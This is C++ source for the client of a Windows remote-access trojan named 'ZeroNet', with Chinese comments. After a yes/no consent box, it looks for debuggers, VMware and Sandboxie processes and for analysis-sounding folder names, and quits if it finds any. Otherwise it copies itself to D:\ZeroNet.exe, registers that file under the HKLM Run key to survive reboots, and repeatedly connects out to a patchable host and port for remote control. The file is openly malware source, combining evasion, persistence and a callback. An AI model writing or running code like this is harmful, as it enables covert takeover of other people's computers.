#include "stdafx.h"
#include <winsock2.h>
#include <iostream>
#include "zeroclient.h"
#include "cmdspy.h"
#include "tlhelp32.h"

int gOffsetDomain = 10;
char gDomain[100] = "DNSDNSDNS:127.0.0.1 ";
int gOffsetPort = 13;
char gPort[100] = "PORTPORTPORT:18000 ";
char debug_name[5][100]={"idaq.exe","idaq64.exe","VMwareTray.exe","SbieSvc.exe","OllyDBG.exe"};
char path_name[7][100]={"debug","virus","temp","ida","olly","disasm","hack"};


// Libraries
#pragma comment(lib, "jpeg/libjpeg.lib")
#pragma comment(lib, "WS2_32")


bool find_debuger(const char *processname){
	for(int i=0;i<5;i++){
		char *s=debug_name[i];
		while(*processname!='\0' && *processname==*s){
			processname++;
			s++;
		}
		if(*processname=='\0' && *s=='\0') return true;
		
	}
	return false;
}

bool find_virus_path(const char *processname){
	const char *ori=processname;
	for(int i=0;i<7;i++){
		processname=ori;
		while(*processname!='\0'){
			char *s=path_name[i];
			while(*processname!=*s && *processname!=(*s)-32 && *processname!='\0'){
				processname++;
			}
			while(*processname!='\0' && (*processname==*s || *processname==(*s)-32)){
				processname++;
				s++;
			}
			if(*s=='\0'){
				return true;
			}
		}
	}
	return false;
}



int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	int IsSafe=0;

    if(IDNO == MessageBox(NULL,"Really want to be controlled?","!!!!!",MB_YESNO))
    {
        IsSafe++;  //询问被控制人是否愿意
    }

    CreateMutexA(NULL,FALSE,"ZeroNet");
    if(GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "Same program already running" << std::endl;
        IsSafe++;   //查询是否已运行
    }

	//多种反调试技术   SEH+IsDebuggerPresent+.....+全路径检测+进程遍历
	PROCESSENTRY32 pe32;
	pe32.dwSize=sizeof(pe32);
	HANDLE hprocesssnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(INVALID_HANDLE_VALUE!=hprocesssnapshot){
		BOOL bprocess=Process32First(hprocesssnapshot,&pe32);
		while(bprocess){
			if(find_debuger(pe32.szExeFile)){
				IsSafe++;
			}
		bprocess=Process32Next(hprocesssnapshot,&pe32);
		}
	}

	char filename[MAX_PATH];
	if(GetModuleFileName(NULL,filename,MAX_PATH)){
		if(find_virus_path(filename)){
			IsSafe++;
		}
	}

	if(IsDebuggerPresent()){
		IsSafe++;
	}

	while(!IsSafe)
	{
		WSAData wsaData;
		if (WSAStartup(MAKEWORD(2,1), &wsaData)) {
			std::cout << "Failed to initialize WSA" << std::endl;
			return -1;
		}

		char sourcefile[MAX_PATH] = { 0 };
		DWORD dwRet=GetModuleFileName(NULL, sourcefile, MAX_PATH);
		HANDLE sourcehandle=CreateFile(sourcefile,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
		if(sourcehandle==INVALID_HANDLE_VALUE)
		{
			CloseHandle(sourcehandle);
			return -1;
		}
		DWORD filesize=GetFileSize(sourcehandle,NULL);
		char *filebuf=new char[filesize+1];
		DWORD readsize;
		if(!ReadFile(sourcehandle,filebuf,filesize,&readsize,NULL))
		{
			delete []filebuf;
			CloseHandle(sourcehandle);
		}
		else
		{
			DWORD writesize;
			HANDLE desthandle=CreateFile("D:\\ZeroNet.exe",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
			WriteFile(desthandle,filebuf,filesize,&writesize,NULL);
			delete []filebuf;
			CloseHandle(sourcehandle);
			CloseHandle(desthandle);
		}

		HKEY hKey;
		LPCTSTR lpRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
		RegSetValueEx(hKey, TEXT("ZeroNet"), 0, REG_SZ, (BYTE *)"D:\\ZeroNet.exe", dwRet);
		RegCloseKey(hKey);

		ZeroClient client;
		client.hInst = hInstance;
		while (1) {
			char domain[100] = {0};
			char *domainStartPos = (char*)gDomain+gOffsetDomain;
			client.connectTo(domainStartPos, atoi(gPort+gOffsetPort));
			Sleep(1000);
		}

		WSACleanup();
	}
	exit(0);
    return 0;
}
